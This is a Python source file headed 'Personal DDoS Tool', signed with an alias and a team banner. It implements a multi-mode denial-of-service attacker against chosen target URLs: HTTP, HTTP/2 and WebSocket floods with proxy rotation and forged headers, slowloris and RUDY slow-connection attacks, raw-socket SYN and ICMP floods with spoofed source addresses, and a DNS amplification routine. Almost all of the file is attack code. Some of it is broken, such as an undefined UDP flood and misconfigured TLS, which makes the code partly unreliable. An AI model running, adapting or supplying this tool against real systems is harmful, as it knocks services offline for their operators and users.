#!/bin/bash

# Personal DDoS Tool
# Author: [NoneR00tk1t]

import threading
import requests
import time
import random
import socket
import ssl
import urllib.parse
import json
import os
import asyncio
import aiohttp
import concurrent.futures
import logging
import argparse
import struct
import colorama
from colorama import Fore, Back, Style
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from fake_useragent import UserAgent
from queue import Queue
import signal
import h2.connection
import h2.config
import numpy as np
from dataclasses import dataclass
from collections import deque

@dataclass
class Proxy:
    url: str
    healthy: bool = True
    last_used: float = 0
    failures: int = 0

class RateLimiter:
    def __init__(self, rate: int, burst_factor: float = 2.0, ramp_up_time: int = 10):
        self.rate = rate
        self.max_tokens = rate * burst_factor
        self.tokens = self.max_tokens
        self.last_refill = time.time()
        self.lock = threading.Lock()
        self.ramp_up_time = ramp_up_time
        self.start_time = None
        self.current_rate = 1
    
    def _get_current_rate(self):
        if self.start_time is None:
            self.start_time = time.time()
        elapsed = time.time() - self.start_time
        if elapsed < self.ramp_up_time:
            return int(self.rate * (elapsed / self.ramp_up_time))
        return self.rate
    
    def allow(self, tokens: int = 1) -> bool:
        with self.lock:
            now = time.time()
            elapsed = now - self.last_refill
            current_rate = self._get_current_rate()
            self.tokens = min(self.max_tokens, self.tokens + elapsed * current_rate)
            self.last_refill = now
            
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

class AdvancedLoadTester:
    def __init__(self, target_url: str, attack_type: str = "mixed", duration: int = 120, 
                 rate: int = 1000, concurrent_connections: int = 500, 
                 proxy_list: List[str] = None, 
                 user_agents_file: Optional[str] = None,
                 log_level: str = "DEBUG",
                 max_retries: int = 5,
                 enable_http2: bool = True,
                 enable_websocket: bool = True,
                 multiple_targets: List[str] = None):
        self.target_urls = [target_url] + (multiple_targets or [])
        self.attack_type = attack_type.lower()
        self.duration = duration
        self.rate = rate
        self.concurrent_connections = concurrent_connections
        self.proxy_list = [Proxy(url) for url in (proxy_list or [])]
        self.user_agents_file = user_agents_file
        self.ua = UserAgent()
        self.max_retries = max_retries
        self.enable_http2 = enable_http2
        self.enable_websocket = enable_websocket
        
        self._setup_logging(log_level)
        
        self.stats = {
            'success': 0,
            'failed': 0,
            'timeout': 0,
            'retries': 0,
            'start_time': 0,
            'end_time': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'status_codes': {},
            'response_times': deque(maxlen=20000),
            'peak_rps': 0,
            'throughput': 0
        }
        
        self.running = False
        self.lock = threading.Lock()
        self.target_ips = [self.resolve_dns(url) for url in self.target_urls]
        self.proxy_queue = Queue()
        for proxy in self.proxy_list:
            self.proxy_queue.put(proxy)
        
        self.user_agents = self.load_user_agents(user_agents_file)
        self.rate_limiter = RateLimiter(rate)
        self.circuit_breaker = CircuitBreaker(max_failures=10, reset_timeout=60)
        
        signal.signal(signal.SIGINT, self._signal_handler)
        
        self.attack_patterns = {
            'http': self.async_http_flood,
            'slowloris': self.slowloris_attack,
            'udp': self.udp_flood,
            'mixed': self.async_mixed_attack,
            'websocket': self.async_websocket_attack,
            'syn': self.syn_flood,
            'icmp': self.icmp_flood,
            'dns_amp': self.dns_amplification_attack,
            'rudy': self.rudy_attack
        }
        
        self.validate_proxies()
    
    def _setup_logging(self, log_level: str) -> None:
        logging.basicConfig(
            level=getattr(logging, log_level.upper()),
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'load_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def resolve_dns(self, url: str) -> str:
        try:
            domain = urllib.parse.urlparse(url).netloc.split(':')[0]
            ip = socket.gethostbyname(domain)
            self.logger.info(f"Resolved {domain} to {ip}")
            return ip
        except socket.gaierror as e:
            self.logger.error(f"DNS resolution failed for {url}: {e}")
            return "Unknown"
    
    def load_user_agents(self, file_path: Optional[str]) -> List[str]:
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'r') as f:
                    agents = [line.strip() for line in f if line.strip()]
                    self.logger.info(f"Loaded {len(agents)} user agents from file")
                    return agents
            except Exception as e:
                self.logger.error(f"Failed to load user agents from file: {e}")
        
        agents = [self.ua.random for _ in range(500)]
        self.logger.info(f"Generated {len(agents)} random user agents")
        return agents
    
    def get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)
    
    def get_random_proxy(self) -> Optional[Dict[str, str]]:
        if self.proxy_queue.empty():
            return None
        
        proxy = self.proxy_queue.get()
        if proxy.healthy and (time.time() - proxy.last_used > 0.5):
            proxy.last_used = time.time()
            self.proxy_queue.put(proxy)
            return {'http': proxy.url, 'https': proxy.url}
        else:
            proxy.failures += 1
            if proxy.failures > 3:
                proxy.healthy = False
            self.proxy_queue.put(proxy)
            return self.get_random_proxy()  
    
    def validate_proxies(self) -> None:
        def check_proxy(proxy: Proxy) -> bool:
            try:
                response = requests.get('http://ip-api.com/json', proxies={'http': proxy.url, 'https': proxy.url}, timeout=5)
                if response.status_code == 200:
                    return True
            except:
                pass
            proxy.healthy = False
            return False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_proxy, p) for p in self.proxy_list]
            concurrent.futures.wait(futures)
        
        self.proxy_list = [p for p in self.proxy_list if p.healthy]
        self.logger.info(f"Validated {len(self.proxy_list)} healthy proxies")
        for p in self.proxy_list:
            self.proxy_queue.put(p)
    
    def get_random_referer(self) -> str:
        domains = ['google.com', 'yahoo.com', 'bing.com', 'facebook.com', 'x.com', 'linkedin.com', 'reddit.com']
        paths = ['', 'search', 'results', 'page', 'article', 'profile', 'news', 'forum']
        query_params = ['', f'?q={random.randint(1000, 9999)}', f'?id={random.randint(1000, 9999)}', f'?search={random.choice(["test", "update", "news"])}']
        return f"https://{random.choice(domains)}/{random.choice(paths)}{random.choice(query_params)}"
    
    def generate_random_payload(self, content_type: str = 'json', size: int = 512) -> Tuple[Dict, str]:
        payload_types = {
            'json': lambda: (
                {'data': json.dumps({
                    'id': random.randint(1, 100000),
                    'action': random.choice(['test', 'update', 'create', 'delete', 'query']),
                    'timestamp': datetime.now().isoformat(),
                    'user_id': f'user_{random.randint(1, 100000)}',
                    'details': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=size))
                })},
                'application/json'
            ),
            'form': lambda: (
                {
                    'username': f'user{random.randint(1, 100000)}',
                    'email': f'test{random.randint(1, 100000)}@example.com',
                    'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=size))
                },
                'application/x-www-form-urlencoded'
            ),
            'xml': lambda: (
                {'xml': f'<data><id>{random.randint(1, 100000)}</id><value>{random.randint(1000, 9999)}</value><details>{"".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=size))}</details></data>'},
                'application/xml'
            ),
            'multipart': lambda: (
                {'file': (None, ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=size * 2)), 'text/plain')},
                'multipart/form-data'
            ),
            'binary': lambda: (
                {'bin': os.urandom(size)},
                'application/octet-stream'
            )
        }
        return payload_types.get(content_type, payload_types['json'])()
    
    def get_random_target(self) -> str:
        return random.choice(self.target_urls)
    
    async def async_http_flood(self, session: aiohttp.ClientSession) -> None:
        while self.running and self.rate_limiter.allow():
            if not self.circuit_breaker.allow():
                self.logger.warning("Circuit breaker open, pausing")
                await asyncio.sleep(2)
                continue
                
            target = self.get_random_target()
            for attempt in range(self.max_retries):
                try:
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br, zstd',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Referer': self.get_random_referer(),
                        'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}',
                        'Origin': random.choice(['https://google.com', 'https://example.com'])
                    }
                    
                    method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'PATCH'])
                    start_time = time.time()
                    content_type = random.choice(['json', 'form', 'xml', 'multipart', 'binary'])
                    payload, content_type_header = self.generate_random_payload(content_type, random.randint(256, 4096))
                    headers['Content-Type'] = content_type_header
                    
                    proxy = self.get_random_proxy()
                    params = {'headers': headers, 'timeout': 15}
                    if method in ['POST', 'PUT', 'PATCH']:
                        params['data'] = payload
                    if proxy:
                        params['proxy'] = proxy['http']
                    
                    async with session.request(method, target, **params) as response:
                        response_time = time.time() - start_time
                        content = await response.read()
                        
                        with self.lock:
                            self.stats['success'] += 1
                            self.stats['bytes_received'] += len(content)
                            self.stats['bytes_sent'] += len(json.dumps(payload)) if 'data' in params else 0
                            self.stats['response_times'].append(response_time)
                            self.stats['status_codes'][response.status] = self.stats['status_codes'].get(response.status, 0) + 1
                        
                        self.circuit_breaker.record_success()
                        break
                        
                except asyncio.TimeoutError:
                    with self.lock:
                        self.stats['timeout'] += 1
                    self.circuit_breaker.record_failure()
                    self.logger.warning(f"Timeout (attempt {attempt + 1}) for {target}")
                except Exception as e:
                    with self.lock:
                        self.stats['failed'] += 1
                        self.stats['retries'] += 1
                    self.circuit_breaker.record_failure()
                    self.logger.error(f"Failed (attempt {attempt + 1}) for {target}: {e}")
                    if attempt < self.max_retries - 1:
                        await asyncio.sleep(2 ** attempt + random.random())
                finally:
                    await asyncio.sleep(random.uniform(0.005, 0.05))
    
    async def async_http2_flood(self, session: aiohttp.ClientSession) -> None:
        if not self.enable_http2:
            return await self.async_http_flood(session)
            
        while self.running and self.rate_limiter.allow():
            target = self.get_random_target()
            try:
                h2_conn = h2.connection.H2Connection(config=h2.config.H2Configuration())
                h2_conn.initiate_connection()
                
                headers = [
                    (':method', random.choice(['GET', 'POST', 'PUT'])),
                    (':path', urllib.parse.urlparse(target).path or '/'),
                    (':scheme', 'https'),
                    (':authority', urllib.parse.urlparse(target).hostname),
                    ('user-agent', self.get_random_user_agent()),
                    ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                    ('accept-encoding', 'gzip, deflate, br'),
                    ('content-type', 'application/json')
                ]
                
                stream_id = h2_conn.get_next_available_stream_id()
                h2_conn.send_headers(stream_id, headers)
                if headers[0][1] in ['POST', 'PUT']:
                    payload = json.dumps({'data': random.randint(1, 10000)})
                    h2_conn.send_data(stream_id, payload.encode())
                
                async with session.request('GET', target, headers={'Connection': 'Upgrade', 'Upgrade': 'h2c'}) as response:
                    with self.lock:
                        self.stats['success'] += 1
                        self.stats['bytes_received'] += len(await response.read())
                        self.stats['status_codes'][response.status] = self.stats['status_codes'].get(response.status, 0) + 1
                        
                await asyncio.sleep(random.uniform(0.005, 0.05))
                
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
                self.logger.error(f"HTTP/2 failed for {target}: {e}")
    
    async def async_websocket_attack(self, session: aiohttp.ClientSession) -> None:
        while self.running and self.rate_limiter.allow():
            target = self.get_random_target()
            ws_url = target.replace('http://', 'ws://').replace('https://', 'wss://')
            try:
                async with session.ws_connect(ws_url, heartbeat=5.0) as ws:
                    while self.running:
                        message_size = random.randint(128, 2048)
                        message = json.dumps({
                            'type': random.choice(['test', 'query', 'update']),
                            'payload': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=message_size)),
                            'timestamp': datetime.now().isoformat()
                        })
                        await ws.send_str(message)
                        with self.lock:
                            self.stats['success'] += 1
                            self.stats['bytes_sent'] += len(message)
                        response = await ws.receive(timeout=5)
                        if response.type == aiohttp.WSMsgType.TEXT:
                            with self.lock:
                                self.stats['bytes_received'] += len(response.data)
                        elif response.type == aiohttp.WSMsgType.CLOSED:
                            break
                        await asyncio.sleep(random.uniform(0.02, 0.1))
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
                self.logger.error(f"WebSocket failed for {ws_url}: {e}")
                await asyncio.sleep(2)
    
    def slowloris_attack(self) -> None:
        target = random.choice(self.target_urls)
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        path = parsed_url.path or '/'
        
        connections = []
        max_connections = min(5000, self.concurrent_connections * 5)
        
        for _ in range(max_connections):
            try:
                sock = self._create_socket(parsed_url.scheme, host, port)
                request = self._build_slowloris_request(host, path)
                sock.send(request.encode())
                connections.append(sock)
                with self.lock:
                    self.stats['bytes_sent'] += len(request)
            except Exception as e:
                self.logger.debug(f"Connection failed: {e}")
                continue
        
        while self.running and connections:
            for sock in connections[:]:
                try:
                    header = f"X-{random.randint(1000, 9999)}: {random.randint(1000, 9999)}\r\n"
                    sock.send(header.encode())
                    with self.lock:
                        self.stats['bytes_sent'] += len(header)
                    time.sleep(random.uniform(2, 8))
                except:
                    connections.remove(sock)
                    with self.lock:
                        self.stats['failed'] += 1
                    self.logger.debug("Connection dropped")
        
        self._cleanup_connections(connections)
    
    def rudy_attack(self) -> None:
        target = random.choice(self.target_urls)
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        path = parsed_url.path or '/'
        
        connections = []
        max_connections = min(3000, self.concurrent_connections * 3)
        
        for _ in range(max_connections):
            try:
                sock = self._create_socket(parsed_url.scheme, host, port)
                request = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {self.get_random_user_agent()}\r\nAccept: text/html\r\nContent-Length: {random.randint(10000, 100000)}\r\nConnection: keep-alive\r\n"
                sock.send(request.encode())
                connections.append(sock)
            except:
                continue
        
        while self.running and connections:
            for sock in connections[:]:
                try:
                    chunk = os.urandom(random.randint(1, 10))
                    sock.send(chunk)
                    with self.lock:
                        self.stats['bytes_sent'] += len(chunk)
                    time.sleep(random.uniform(1, 5))
                except:
                    connections.remove(sock)
                    with self.lock:
                        self.stats['failed'] += 1
        
        self._cleanup_connections(connections)
    
    def syn_flood(self) -> None:
        target = random.choice(self.target_urls)
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port or 80
        
        while self.running and self.rate_limiter.allow():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                source_port = random.randint(1024, 65535)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1,65535), 64, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(host))
                tcp_header = struct.pack('!HHLLBBHHH', source_port, port, random.randint(1,4294967295), 0, 50, 2, 5840, 0, 0)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (host, 0))
                
                with self.lock:
                    self.stats['success'] += 1
                    self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
                self.logger.error(f"SYN flood failed: {e}")
            finally:
                time.sleep(random.uniform(0.001, 0.01))
    
    def icmp_flood(self) -> None:
        target = random.choice(self.target_urls)
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while self.running and self.rate_limiter.allow():
            try:
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 1024 + 20, random.randint(1,65535), 64, socket.IPPROTO_ICMP, 0, socket.inet_aton(source_ip), socket.inet_aton(host))
                
                icmp_type = 8  
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                
                data = os.urandom(1024)
                checksum = self._checksum(icmp_header + data)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                
                packet = ip_header + icmp_header + data
                s.sendto(packet, (host, 0))
                
                with self.lock:
                    self.stats['success'] += 1
                    self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
                self.logger.error(f"ICMP flood failed: {e}")
            finally:
                time.sleep(random.uniform(0.001, 0.01))
    
    def _checksum(self, data) -> int:
        if len(data) % 2:
            data += b'\0'
        summed = sum(struct.unpack('!%sH' % (len(data) // 2), data))
        summed = (summed >> 16) + (summed & 0xFFFF)
        summed += summed >> 16
        return ~summed & 0xFFFF
    
    def dns_amplification_attack(self) -> None:
        open_resolvers = ['8.8.8.8', '9.9.9.9', '208.67.222.222']  
        target = random.choice(self.target_urls)
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        
        while self.running and self.rate_limiter.allow():
            try:
                resolver = random.choice(open_resolvers)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.bind(('', 0))
                
                spoofed_ip = host  
                
                dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\xff'  
                
                s.sendto(dns_query, (resolver, 53))
                
                with self.lock:
                    self.stats['success'] += 1
                    self.stats['bytes_sent'] += len(dns_query)
                
            except Exception as e:
                with self.lock:
                    self.stats['failed'] += 1
                self.logger.error(f"DNS amp failed: {e}")
            finally:
                time.sleep(random.uniform(0.001, 0.01))
                s.close()
    
    def _create_socket(self, scheme: str, host: str, port: int) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(20)
        
        if scheme == 'https':
            context = ssl.create_default_context()
            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2  
            sock = context.wrap_socket(sock, server_hostname=host)
        
        sock.connect((host, port))
        return sock
    
    def _build_slowloris_request(self, host: str, path: str) -> str:
        headers = [
            f"GET {path}?{random.randint(1000,9999)} HTTP/1.1",
            f"Host: {host}",
            f"User-Agent: {self.get_random_user_agent()}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Connection: keep-alive",
            f"Cache-Control: no-cache",
            f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ]
        return "\r\n".join(headers) + "\r\n\r\n"
    
    def _cleanup_connections(self, connections: List[socket.socket]) -> None:
        for sock in connections:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
    
    async def async_mixed_attack(self, session: aiohttp.ClientSession) -> None:
        attack_types = [
            (self.async_http_flood, session, 0.4),
            (self.async_http2_flood, session, 0.2),
            (self.slowloris_attack, None, 0.1),
            (self.async_websocket_attack, session, 0.1),
            (self.rudy_attack, None, 0.1),
            (self.syn_flood, None, 0.05),
            (self.icmp_flood, None, 0.05)
        ]
        weights = [w for _, _, w in attack_types]
        selected_attack, arg, _ = random.choices(attack_types, weights=weights, k=1)[0]
        if asyncio.iscoroutinefunction(selected_attack):
            await selected_attack(arg if arg else session)
        else:
            selected_attack()
    
    def start_async_attack(self) -> None:
        async def run_async_attack():
            connector = aiohttp.TCPConnector(
                limit=self.concurrent_connections * 2,
                limit_per_host=100,
                verify_ssl=False,
                force_close=False,
                enable_cleanup_closed=True,
                ttl_dns_cache=300
            )
            async with aiohttp.ClientSession(
                connector=connector,
                trust_env=True,
                auto_decompress=True,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as session:
                tasks = []
                for _ in range(self.concurrent_connections):
                    task = asyncio.create_task(
                        self.attack_patterns.get(self.attack_type, self.async_mixed_attack)(session)
                    )
                    tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
        
        try:
            asyncio.run(run_async_attack())
        except Exception as e:
            self.logger.error(f"Async failed: {e}")
    
    def start(self) -> None:
        self.running = True
        self.stats['start_time'] = time.time()
        
        self.logger.info(f"Starting {self.attack_type} attack on targets: {', '.join(self.target_urls)}")
        self.logger.info(f"Duration: {self.duration}s | Rate: {self.rate}/s | Connections: {self.concurrent_connections}")
        self.logger.info(f"Healthy proxies: {len(self.proxy_list)}")
        
        threads = []
        
        if self.attack_type in ["http", "websocket", "mixed"]:
            for _ in range(5):  
                thread = threading.Thread(target=self.start_async_attack, daemon=True)
                threads.append(thread)
                thread.start()
            
        if self.attack_type in ["slowloris", "rudy", "mixed"]:
            for _ in range(min(self.concurrent_connections * 2, 5000)):
                thread = threading.Thread(target=self.attack_patterns.get(self.attack_type, self.slowloris_attack), daemon=True)
                threads.append(thread)
                thread.start()
                
        if self.attack_type in ["udp", "syn", "icmp", "dns_amp", "mixed"]:
            for _ in range(min(self.rate * 2, 1000)):
                thread = threading.Thread(target=self.attack_patterns.get(self.attack_type, self.udp_flood), daemon=True)
                threads.append(thread)
                thread.start()
        
        stop_thread = threading.Timer(self.duration, self.stop)
        stop_thread.start()
        
        self.show_stats()
        
        for thread in threads:
            thread.join(timeout=10.0)
        
        stop_thread.join()
        
        self.print_final_stats()
    
    def stop(self) -> None:
        self.running = False
        self.stats['end_time'] = time.time()
        self.logger.info("Stopped")
    
    def _signal_handler(self, sig, frame) -> None:
        self.logger.info("Interrupt, stopping...")
        self.stop()
    
    def show_stats(self) -> None:
        def stats_loop():
            start_time = time.time()
            last_count = 0
            last_bytes = 0
            
            while self.running:
                time.sleep(1)
                with self.lock:
                    total = self.stats['success'] + self.stats['failed'] + self.stats['timeout']
                    elapsed = time.time() - start_time
                    
                    if elapsed > 0:
                        current_rps = (total - last_count)
                        self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
                        avg_rps = total / elapsed
                        current_throughput = (self.stats['bytes_received'] - last_bytes) / 1024 / 1024
                        self.stats['throughput'] = max(self.stats['throughput'], current_throughput)
                        
                        stats_str = (
                            f"\rTotal: {total:,} | Success: {self.stats['success']:,} | "
                            f"Failed: {self.stats['failed']:,} | Timeout: {self.stats['timeout']:,} | "
                            f"RPS: {current_rps:,.1f} | Avg: {avg_rps:,.1f} | "
                            f"TP: {current_throughput:,.2f} MB/s | Sent: {self.stats['bytes_sent']/1024/1024:,.2f} MB"
                        )
                        print(stats_str, end='')
                        self.logger.debug(stats_str)
                        
                        last_count = total
                        last_bytes = self.stats['bytes_received']
        
        threading.Thread(target=stats_loop, daemon=True).start()
    
    def print_final_stats(self) -> None:
        total_time = self.stats['end_time'] - self.stats['start_time']
        total_requests = self.stats['success'] + self.stats['failed'] + self.stats['timeout']
        
        stats_output = [
            "=" * 100,
            "ATTACK SUMMARY",
            "=" * 100,
            f"Targets: {', '.join(self.target_urls)}",
            f"Type: {self.attack_type}",
            f"Duration: {total_time:,.2f} s",
            f"Total req: {total_requests:,}",
            f"Success: {self.stats['success']:,}",
            f"Failed: {self.stats['failed']:,}",
            f"Timeout: {self.stats['timeout']:,}",
            f"Retries: {self.stats['retries']:,}",
            f"Sent: {self.stats['bytes_sent'] / 1024 / 1024 / 1024:,.2f} GB",
            f"Received: {self.stats['bytes_received'] / 1024 / 1024 / 1024:,.2f} GB",
            f"Peak TP: {self.stats['throughput']:,.2f} MB/s"
        ]
        
        if total_time > 0:
            stats_output.extend([
                f"Avg RPS: {total_requests/total_time:,.2f}",
                f"Peak RPS: {self.stats['peak_rps']:,.2f}"
            ])
        
        success_rate = (self.stats['success'] / total_requests * 100) if total_requests > 0 else 0
        stats_output.append(f"Success: {success_rate:,.1f}%")
        
        if self.stats['response_times']:
            response_times = np.array(list(self.stats['response_times']))
            stats_output.extend([
                f"Avg RT: {np.mean(response_times):,.3f} s",
                f"P50 RT: {np.percentile(response_times, 50):,.3f} s",
                f"P95 RT: {np.percentile(response_times, 95):,.3f} s",
                f"P99 RT: {np.percentile(response_times, 99):,.3f} s",
                f"Max RT: {np.max(response_times):,.3f} s"
            ])
        
        stats_output.append("Status codes:")
        for code, count in sorted(self.stats['status_codes'].items()):
            stats_output.append(f"  {code}: {count:,}")
        
        stats_output.append("=" * 100)
        
        for line in stats_output:
            print(line)
            self.logger.info(line)

class CircuitBreaker:
    def __init__(self, max_failures: int, reset_timeout: int):
        self.max_failures = max_failures
        self.reset_timeout = reset_timeout
        self.failures = 0
        self.last_failure = 0
        self.state = 'CLOSED'
        self.lock = threading.Lock()
    
    def allow(self) -> bool:
        with self.lock:
            if self.state == 'OPEN':
                if time.time() - self.last_failure > self.reset_timeout:
                    self.state = 'HALF_OPEN'
                    self.failures = 0
                    return True
                return False
            return True
    
    def record_success(self) -> None:
        with self.lock:
            if self.state == 'HALF_OPEN':
                self.state = 'CLOSED'
            self.failures = max(0, self.failures - 1)
    
    def record_failure(self) -> None:
        with self.lock:
            self.failures += 1
            if self.failures >= self.max_failures:
                self.state = 'OPEN'
                self.last_failure = time.time()




colorama.init(autoreset=True)
def print_banner():
    print(f"""
{Fore.RED}[x] {Fore.WHITE}OPERATOR: {Fore.LIGHTBLACK_EX}[NoneR00tk1t]
{Fore.RED}[x] {Fore.WHITE}TEAM: {Fore.LIGHTBLACK_EX}[Valhala]
{Fore.LIGHTMAGENTA_EX}
                                                                                ..            
           .:                                                                         ;;            
           :X.                                                                       x$:            
       ..  .XX.                                                                    :X&;   ::        
       .+.  :X$+.                                                                .+$$:   ;X.        
        ;$:   x&$:                                                             .+X&X:. :X&:         
      :  :X$;. :X&$+:                                                       :;XX&X: .;X$X.  .;      
      :x.  :x$X+::x&$X;:                                                .;+xX$&x;;xX$&X:  .;$.      
       :$$+. .;$$$$x+$&&X++.            ..                          .;x+X&&&$$&&$$$+:  .;X$x.       
      .;.;X$&&&X+x$&&&&&&&&&$X+::.   .++. :;.         :++X$;  ::+XX$$&&&&&&&&&&&$X$&&&&$X;.;:       
       .+x;:;+xX$&&&&&&&&&&&&&&$$$X+::;     .        ::   :;;X$$$$$&&&&&&&&&&&&&&$X+;:;;xXX:        
         :X$$&&$$XXX$&&&&&&&&&&&&&&&$X; ::              ; ;X$&&&&&&&&&&&&&&&&&&&&&&&&&&$+.          
       .;;::;+xX$$$$&&&&&&&&&&&&&&&&&$&&x++;:...        +;X$&&&&&$$$&&&&&&&&&&$$$Xx;:::;xX+.        
         .;X$$$$$$&&&&$$&&&&&&&&$$&&&$$X$$&&&&$X+:.    .;;X&&&&&&$$&&&&&&&&$&&&&&&&&&$$x;           
            .:+X$$$$$$$&$&&&&&&&$$&&&&&&X:+&&$$XXXx;.  ::;X&&&&$$$$&&&&&&&&&&&&&&$X+:..  :+;        
         :xx+++xX$&&&&&&$$&&&&&&&$$&&&&&X;.:$&&$XXXx;:  ;;X&&&&&&$&&&&&&&$&&&&&&&&&&$$X+:           
            .:;+XX$$$$$&&$$&&&&$$$$&&&&&X.:+:X&$&&$Xx;. + +$&&&$$$$$$$&$$&&&$&$$Xx+:.               
         :;+X$$$$$$$$$$$$&&$&$X$$$$&&&&&$;.;:xX$$$XX$$x:..;$X&&&$$$$$&$$&&&$$$$$$$$X+:..            
             ..:;+$$X$&&$$$&&$X$$X$$&&&&$&$Xx$$$X$&$$&XXxX$$&&&$$$$$$&&$$$$&$&&&$$X;:.              
                :++XXXXX$&&&&$$$$XX$$&&&&&&x$&&XX$&$$$$$&&&&&&&$X$$$$&&&&$$$$$$XX+;:.               
                  .;X$$$$$X$&&$$$$$X$$$$&&$$&&&$XX$$$&$&&&&&$$$$X$&$$&&$X$$&$X+::.                  
                   .;+XXX$&&$$&&$$$X$$$$$$&&&&&&&&&$&$&&&&&$X$$$$$&&&$$&&$X+:.                      
                      .;X$XX&&$$$&$$$$$X$$&&&&&&&&&&&&&&&&$$$$$$$&&$$&&XX$X;.:.                     
                         :X$xX&$X&&$X&&&&$&&&&&&&&&&&&&&&$$$$&&$&$$&&$x$X+: .                       
                          .+$XX&&$X&&$$&&&&X&&&&&&&&&&&&&&&&&$$&&&&XX$&X:.                          
                            :;:.+$&&&$&$$&$X$&&&&&&$xXX&&$$&$&&$$&XxXx:.                            
                              ...:X&&&&&&&X$&&&&&&&$X&XX$&&&&&&&&x+X;                               
                                   :X;+&&&XX&&X&&&X$&$$XX&$$$X;X:.:;.                               
                                    .:;+++X$XXX&&$$$$$&$$$x;+:+::;.      .                          
                                        .:X$$x&$&&+X$&&$$$;::. .         ;.                         
                                         ;$&$$$&&&X&&&$&&.              .+:                         
                                  .::.  :X$&&&$&&&&&&&&&$.              ;+.                         
                             ;X$&&&&&&&$X$&&&&&&$&&&&&&&$;             :X;                          
                          .x$&&&&&$&&$$&$$&&$$&&&&&&&&&&$X.          .+$;                           
                         ;$&&&x:        ;$X++XX$&&&&&&&&+:.     ::;+X$$:                            
                        ;$$&X.         :Xx.  :&x$&&&&&&&X    .x&&&&&&+.                             
                       :XX&X.     .. :x$$;   :::X&&&&&&$:    X&&&&$$X$$.                            
                       +X$&+    .XXXxX$x+$x. . ;&&&&$$&X:   :&&&$$X;;:::                            
                       +$X&x.   ;; x$x:  ;+;   +&&&&$&$;   ;&&&&&$$+                                
                       ;X+&&:    . ;      :  .+&$$&$$$;  .+&&&$X;:+&                                
                       :X$x&&+.            .;$&&&&&$$: .+$$$x:   ;X.                                
                       :X$XX&&$x:        :;$&&$&&$&X::xX$x:     .:                                  
